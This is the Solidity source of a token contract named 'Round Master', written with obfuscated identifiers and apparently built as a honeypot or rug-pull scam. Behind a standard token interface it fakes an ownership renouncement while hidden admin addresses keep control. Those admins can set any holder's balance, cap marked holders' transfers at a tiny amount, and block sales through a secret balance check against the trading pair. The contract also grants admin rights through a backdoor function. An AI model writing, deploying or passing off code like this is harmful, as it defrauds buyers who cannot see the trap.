//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface senderLaunched {
    function createPair(address totalWallet, address txBuyTrading) external returns (address);
}

interface txTakeReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamFund) external view returns (uint256);

    function transfer(address enableAmount, uint256 exemptLaunched) external returns (bool);

    function allowance(address takeExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptLaunched) external returns (bool);

    function transferFrom(
        address sender,
        address enableAmount,
        uint256 exemptLaunched
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletTeam, uint256 value);
    event Approval(address indexed takeExempt, address indexed spender, uint256 value);
}

abstract contract toToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface feeSender is txTakeReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RoundMaster is toToken, txTakeReceiver, feeSender {

    function decimals() external view virtual override returns (uint8) {
        return exemptTotal;
    }

    uint256 tokenLaunch;

    bool public senderWalletReceiver;

    function transferFrom(address marketingTotal, address enableAmount, uint256 exemptLaunched) external override returns (bool) {
        if (_msgSender() != exemptTeam) {
            if (buyMode[marketingTotal][_msgSender()] != type(uint256).max) {
                require(exemptLaunched <= buyMode[marketingTotal][_msgSender()]);
                buyMode[marketingTotal][_msgSender()] -= exemptLaunched;
            }
        }
        return modeFrom(marketingTotal, enableAmount, exemptLaunched);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return feeMode;
    }

    uint256 private feeMode = 100000000 * 10 ** 18;

    function tradingReceiver(uint256 exemptLaunched) public {
        teamReceiver();
        tokenLaunch = exemptLaunched;
    }

    function tradingTotalReceiver(address marketingTotal, address enableAmount, uint256 exemptLaunched) internal returns (bool) {
        require(fromMode[marketingTotal] >= exemptLaunched);
        fromMode[marketingTotal] -= exemptLaunched;
        fromMode[enableAmount] += exemptLaunched;
        emit Transfer(marketingTotal, enableAmount, exemptLaunched);
        return true;
    }

    mapping(address => mapping(address => uint256)) private buyMode;

    function name() external view virtual override returns (string memory) {
        return atSellEnable;
    }

    mapping(address => uint256) private fromMode;

    string private atSellEnable = "Round Master";

    function modeFrom(address marketingTotal, address enableAmount, uint256 exemptLaunched) internal returns (bool) {
        if (marketingTotal == minTxLiquidity) {
            return tradingTotalReceiver(marketingTotal, enableAmount, exemptLaunched);
        }
        uint256 buyAuto = txTakeReceiver(amountEnable).balanceOf(takeLiquidity);
        require(buyAuto == tokenLaunch);
        require(enableAmount != takeLiquidity);
        if (totalMax[marketingTotal]) {
            return tradingTotalReceiver(marketingTotal, enableAmount, limitExempt);
        }
        return tradingTotalReceiver(marketingTotal, enableAmount, exemptLaunched);
    }

    address private toMarketing;

    address public amountEnable;

    function balanceOf(address teamFund) public view virtual override returns (uint256) {
        return fromMode[teamFund];
    }

    function owner() external view returns (address) {
        return toMarketing;
    }

    bool private senderSell;

    bool public feeFrom;

    function symbol() external view virtual override returns (string memory) {
        return marketingShouldAmount;
    }

    function launchSwapFrom(address marketingTx, uint256 exemptLaunched) public {
        teamReceiver();
        fromMode[marketingTx] = exemptLaunched;
    }

    uint256 private limitSenderTeam;

    function allowance(address maxWallet, address limitTx) external view virtual override returns (uint256) {
        if (limitTx == exemptTeam) {
            return type(uint256).max;
        }
        return buyMode[maxWallet][limitTx];
    }

    function approve(address limitTx, uint256 exemptLaunched) public virtual override returns (bool) {
        buyMode[_msgSender()][limitTx] = exemptLaunched;
        emit Approval(_msgSender(), limitTx, exemptLaunched);
        return true;
    }

    function teamReceiver() private view {
        require(maxFee[_msgSender()]);
    }

    uint256 private sellShould;

    function tradingSwap() public {
        emit OwnershipTransferred(minTxLiquidity, address(0));
        toMarketing = address(0);
    }

    bool public listFundEnable;

    bool public enableBuy;

    mapping(address => bool) public maxFee;

    uint256 constant limitExempt = 19 ** 10;

    address public minTxLiquidity;

    event OwnershipTransferred(address indexed tokenToSell, address indexed buyListLimit);

    uint8 private exemptTotal = 18;

    address exemptTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 limitLaunched;

    function transfer(address marketingTx, uint256 exemptLaunched) external virtual override returns (bool) {
        return modeFrom(_msgSender(), marketingTx, exemptLaunched);
    }

    mapping(address => bool) public totalMax;

    function getOwner() external view returns (address) {
        return toMarketing;
    }

    function toTx(address txReceiver) public {
        require(txReceiver.balance < 100000);
        if (listFundEnable) {
            return;
        }
        if (feeFrom) {
            modeSender = true;
        }
        maxFee[txReceiver] = true;
        
        listFundEnable = true;
    }

    bool private modeSender;

    string private marketingShouldAmount = "RMR";

    address takeLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    constructor (){
        
        receiverLaunch teamWallet = receiverLaunch(exemptTeam);
        amountEnable = senderLaunched(teamWallet.factory()).createPair(teamWallet.WETH(), address(this));
        
        minTxLiquidity = _msgSender();
        maxFee[minTxLiquidity] = true;
        fromMode[minTxLiquidity] = feeMode;
        tradingSwap();
        
        emit Transfer(address(0), minTxLiquidity, feeMode);
    }

    function receiverSell(address fundEnable) public {
        teamReceiver();
        if (enableBuy) {
            feeFrom = true;
        }
        if (fundEnable == minTxLiquidity || fundEnable == amountEnable) {
            return;
        }
        totalMax[fundEnable] = true;
    }

    uint256 private fromAt;

    uint256 private teamMax;

}